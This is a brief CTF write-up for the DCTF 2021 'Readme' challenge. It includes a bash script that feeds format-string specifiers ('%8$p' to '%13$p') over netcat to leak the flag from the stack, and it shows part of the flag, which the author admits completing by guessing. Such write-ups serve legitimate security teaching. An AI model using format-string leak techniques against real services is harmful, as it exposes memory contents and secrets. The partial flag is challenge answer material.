# DCTF 2021

## Readme

> 150
> 
> Read me to get the flag. 
> 
> `nc dctf-chall-readme.westeurope.azurecontainer.io 7481`
>
> [readme](readme)

Tags: _pwn_ _x86-64_ _format-string_


## Summary

Classic leak the flag from the stack with `%p`.


## Exploit

```sh
#!/bin/bash

p=8
for((p=8;p<14;p++)) {
    echo '%'$p'$p' | \
    nc dctf-chall-readme.westeurope.azurecontainer.io 7481 | \
    grep 'hello ' | \
    awk -Fx '{print $NF}' | \
    xxd -r -p | \
    rev
}
```

Output:

```bash
# ./exploit.sh
dctf{n0w_g0_r3ad_s0me_b0
rev: stdin: Invalid or incomplete multibyte or wide character
rev: stdin: Invalid or incomplete multibyte or wide character
```

Yeah, so the input string corrupting stack?  Didn't really look that hard into the problem, just guessed the `0k5` at the end. 